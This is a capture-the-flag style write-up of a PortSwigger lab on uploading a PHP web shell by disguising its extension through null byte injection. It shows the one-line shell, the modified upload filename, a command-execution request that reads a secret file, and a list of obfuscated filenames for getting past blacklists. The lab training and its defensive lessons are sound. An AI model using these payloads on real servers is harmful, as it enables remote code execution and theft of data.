# Web Shell Upload via Obfuscated File Extension

[Web Shell Upload via Obfuscated File Extension](https://portswigger.net/web-security/learning-paths/file-upload-vulnerabilities/insufficient-blacklisting-of-dangerous-file-types/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)

**Difficulty:** Practitioner

**Objective:** Upload a PHP web shell by obfuscating the file extension to bypass the blacklist, then exfiltrate the contents of `/home/carlos/secret`.

This lab is best watched on the YouTube video where we go through the full thought process in real time. Spoiler: the first technique I tried was the correct one.

[YouTube Video](https://youtu.be/l5UYV4Q_oc4)

## Lab Overview

This lab has a file upload function that only allows JPG and PNG files. The server validates the file extension and rejects anything that doesn't match. However, this validation can be bypassed using a classic null byte injection technique that tricks the validator into seeing one extension while the server stores the file with another.

**Login credentials provided:** `wiener:peter`

## The Problem

Uploading `exploit.php` is rejected because the server only accepts `.jpg` and `.png` extensions. The server checks the end of the filename and blocks anything that isn't an image extension.

## The Exploit

### Step 1: Upload a PHP Webshell

Create a PHP webshell:

    <?php system($_GET['cmd']); ?>

Attempt to upload it as `exploit.php`. The server rejects it — only JPG and PNG allowed.

### Step 2: Null Byte Injection

The null byte (`%00`) is a string terminator in many programming languages. When a filename contains a null byte, everything after it is ignored when the file is actually saved to disk, but the validation logic may still see the full string including everything after the null byte.

Intercept the upload request in Burp Suite and change the filename:

    Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"

What happens:
- The **validation** sees `exploit.php%00.jpg` and checks the extension — it ends in `.jpg`, so it passes
- The **filesystem** encounters the null byte and truncates the filename to `exploit.php`

Send the request. The server responds confirming the file was uploaded as `exploit.php`. The null byte and `.jpg` were stripped.

### Step 3: Execute the Webshell

Access the webshell at its stored location:

    GET /files/avatars/exploit.php?cmd=cat+/home/carlos/secret

The server executes the PHP file and returns Carlos's secret.

Submit the secret to solve the lab.

## Other Obfuscation Techniques I Could Have Tried

The null byte was my first attempt and it worked immediately, but there are several other techniques commonly used to bypass extension blacklists:

- **Double extensions:** `exploit.php.jpg` — some servers only check the final extension
- **Trailing characters:** `exploit.php.` or `exploit.php;.jpg` — parsers may handle trailing dots or semicolons differently
- **Case manipulation:** `exploit.pHp` — case-sensitive blacklists miss mixed case
- **Unicode tricks:** using special Unicode characters that normalize to standard ASCII
- **Adding spaces:** `exploit.php .jpg` — spaces in filenames can confuse parsers
- **Multiple dots:** `exploit.php....` — some systems strip trailing dots
- **Alternate extensions:** `exploit.phtml`, `exploit.php5`, `exploit.phar` — alternative PHP extensions

Knowing multiple techniques is important because not every server is vulnerable to the same trick. The null byte works when the validation language handles strings differently from the underlying filesystem.

## Why This Worked

The vulnerability exists because the validation logic and the filesystem handle the null byte differently:

1. **The validator** reads the full filename string including everything after `%00` and concludes the file has a `.jpg` extension
2. **The filesystem** treats `%00` as a string terminator and saves the file as `exploit.php`

This is a classic example of a parsing differential — two components interpret the same input differently, and the gap between their interpretations creates a security vulnerability.

## Key Takeaways

- **Null byte injection is old but still effective.** This technique has been around for decades and still works against modern applications that don't properly handle null bytes in filenames.

- **Extension validation must happen after sanitization.** Strip null bytes, decode URL encoding, and normalize the filename before checking the extension.

- **Allowlists beat blacklists.** Once again, checking that the extension is one of a few permitted values is more secure than trying to block every possible dangerous extension.

- **Test the simplest bypass first.** Having a mental list of techniques ordered by simplicity saves time. The null byte is quick to test and frequently works.

## Tools Used

- Burp Suite Community Edition

## Potential obfuscation attempts you can try

```
exploit.pHp
exploit.php.jpg
exploit.p.phphp


exploit.php.
exploit%2Ephp

exploit.asp;.jpg
exploit.asp%00.jpg

xC0 x2E
xC4 xAE
xC0 xAE
x2E
```